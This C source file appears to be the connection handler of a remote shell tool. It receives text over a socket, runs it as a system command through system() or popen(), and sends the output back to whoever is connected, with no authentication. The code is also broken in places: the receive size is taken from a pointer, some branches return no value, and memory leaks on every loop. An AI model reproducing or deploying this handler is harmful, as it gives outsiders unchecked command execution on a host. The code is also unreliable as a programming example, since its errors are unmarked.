#include "handler.h"
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define BUFFSIZE 1024

void HandleConnection(int conn){
    while (1) {
        char *BUFF = malloc(sizeof(char) * BUFFSIZE);
        char *RESULT = malloc(sizeof(char) * BUFFSIZE);

        if (recv(conn, BUFF, sizeof(BUFF), 0) < 0) {
            printf("Socket recv error");
            exit(0);
        }
        RESULT = exec(BUFF);
        if (send(conn, RESULT, BUFFSIZE, 0) < 0){
            printf("Socket send error");
            exit(0);
        }
        printf("[*] Execute command: %s\n", BUFF);
        printf("[*] RESULT %s\n", RESULT);
        strcpy (RESULT, "");
        strcpy (BUFF, "");
    }
    shutdown(conn, 2);
}


char *exec(char *command){
    char *result = malloc(sizeof(char) * BUFFSIZE);

    #ifdef __linux__
    system(command);
    #elif _WIN32
    return;
    #else
    FILE *fp;
    fp = popen(command, "r");
    fgets(result, sizeof(char) * BUFFSIZE, fp);
    printf("%s", result);
    pclose(fp);
    return result;
    #endif

}
